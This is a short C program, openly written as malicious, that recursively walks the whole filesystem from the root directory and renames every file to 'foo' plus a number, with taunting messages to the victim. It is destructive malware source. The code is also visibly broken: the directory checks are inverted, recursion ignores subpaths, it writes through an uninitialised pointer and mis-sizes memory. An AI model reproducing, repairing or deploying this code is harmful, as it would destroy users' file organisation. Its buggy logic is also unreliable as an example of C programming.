#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#ifdef WIN32
#define PATH_SEPERATOR '\\'
#define ROOT "C:\\"
#else
#define PATH_SEPERATOR '/'
#define ROOT "/"
#endif
int get_files_cci(const char* root,char** files,int n){
    DIR* dir;
    struct dirent* entry;
    if(!(dir = opendir(root)) || !(entry = readdir(dir)))
        return 1;
    do{
        if(strcmp(entry->d_name,".")==0||strcmp(entry->d_name,"..")) continue;
        char path[1024];
        int len = snprintf(path,sizeof(path)-1,"%s/%s",root,entry->d_name);
        path[len] = 0;
        if(entry->d_type == DT_DIR){
            get_files_cci(root,files,n);
        }else{
            files[++n] = path;
        }
    }while(entry = readdir(dir));
    closedir(dir);
    return 0;
}
int get_files_cc(const char* root,char** files){ return get_files_cci(root,files,0); }
int get_file_count_ci(const char* root,int count_start){
    DIR* dir;
    struct dirent* entry;
    int count = count_start;
    if(!(dir = opendir(root)) || !(entry = readdir(dir)))
        return 0;
    do{
        if(strcmp(entry->d_name,".")==0||strcmp(entry->d_name,"..")) continue;
        if(entry->d_type == DT_DIR){
            count += get_file_count_ci(root,count);
        }else{
            count++;
        }
    }while(entry = readdir(dir));
    closedir(dir);
    return count;
}
int get_file_count_c(const char* root){ return get_file_count_ci(root,0); }
char* replace(int pos,int len,const char* str,const char* sub){
    int sublen = strlen(sub);
    int slen =   strlen(str);
    int newlen = (slen-len)+sublen;
    char* string = (char*)malloc(newlen+1);
    int i;
    for(i=0; i<pos;i++)
        string[i] = str[i];
    for(i=0; i<sublen; i++)
        string[pos+i] = sub[i];
    for(i=len; i<slen; i++)
        string[pos+sublen] = str[len+i];
    string[newlen]=0;
    return string;
}
int main(int argc, char const *argv[]){
    printf("Hello, today I will be fucking up your computer.");
    int size = get_file_count_c(ROOT);
    char** file_arr = (char**)malloc(size);
    if(get_files_cc(ROOT,file_arr)) return 1;
    int i=0;
    while(i<size){
        char* name = file_arr[i];
        if(!strcmp(name,"")) continue;
        char* s;
        char* str;
        int l = strrchr(name,PATH_SEPERATOR)-name;
        int l2 = strrchr(name,'.')-name;
        s = replace(l,(l2-l),"foo%d",name);
        sprintf(str,s,i);
        rename(name,str);
        i++;
    }
    printf("Replaced all of your filenames with foo.");
    printf("Good luck trying to figure out what is what!");
    return 0;
}

